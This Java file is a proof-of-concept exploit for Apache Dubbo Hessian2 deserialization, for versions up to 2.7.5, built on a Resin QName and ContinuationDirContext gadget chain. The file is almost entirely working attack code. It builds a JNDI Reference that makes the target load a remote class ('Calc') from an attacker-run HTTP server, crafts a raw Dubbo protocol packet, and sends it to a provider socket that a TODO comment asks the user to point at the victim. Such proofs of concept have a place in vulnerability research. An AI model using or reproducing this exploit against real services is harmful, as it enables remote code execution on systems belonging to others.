/*
 * [业务问题]: Apache Dubbo Hessian2 反序列化漏洞利用 (Resin 链)。
 * [实现逻辑]: Dubbo 默认使用 Hessian2 序列化协议。本 POC 利用 Resin 库中的 QName 类结合 ContinuationDirContext 构造利用链，通过报错或 JNDI 注入实现远程代码执行 (RCE)。
 */
package com.security.bug.dubbo;

import com.caucho.hessian.io.Hessian2Output;
import com.caucho.naming.QName;
import com.security.bug.common.server.HTTPServer;
import com.security.bug.dubbo.support.NoWriteReplaceSerializerFactory;
import com.security.bug.common.utils.Reflections;
import com.security.bug.dubbo.utils.ToStringUtil;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.Hashtable;
import java.util.Random;
import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;

/**
 * dubbo 默认配置，即 hessian2 反序列化漏洞验证。
 * 适用版本: Dubbo <= 2.7.5
 */
public class ResinPoc {

  static {
    HTTPServer.run(null);
  }

  public static void main(String[] args) throws InterruptedException {
    try {
      Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
      Constructor<?> ccCons = ccCl
          .getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
      ccCons.setAccessible(true);
      CannotProceedException cpe = new CannotProceedException();
      Reflections.setFieldValue(cpe, "cause", null);
      Reflections.setFieldValue(cpe, "stackTrace", null);

      cpe.setResolvedObj(new Reference("Foo", "Calc", "http://127.0.0.1:8080/"));

      Reflections.setFieldValue(cpe, "suppressedExceptions", null);
      DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
      QName qName = new QName(ctx, "foo", "bar");

      Object o = ToStringUtil.makeToStringTrigger(qName);

      ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

      // header.
      byte[] header = new byte[16];
      // set magic number.
      Bytes.short2bytes((short) 0xdabb, header);
      // set request and serialization flag.
      header[2] = (byte) ((byte) 0x80 | 0x20 | 2);

      // set request id.
      Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

      ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
      Hessian2Output out = new Hessian2Output(hessian2ByteArrayOutputStream);
      NoWriteReplaceSerializerFactory sf = new NoWriteReplaceSerializerFactory();
      sf.setAllowNonSerializable(true);
      out.setSerializerFactory(sf);

      out.writeObject(o);
      out.flushBuffer();
      if (out instanceof Cleanable) {
        ((Cleanable) out).cleanup();
      }

      Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
      byteArrayOutputStream.write(header);
      byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

      byte[] bytes = byteArrayOutputStream.toByteArray();

      //todo 此处填写被攻击的dubbo服务提供者地址和端口
      Socket socket = new Socket("127.0.0.1", 20880);
      OutputStream outputStream = socket.getOutputStream();
      outputStream.write(bytes);
      outputStream.flush();
      outputStream.close();
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
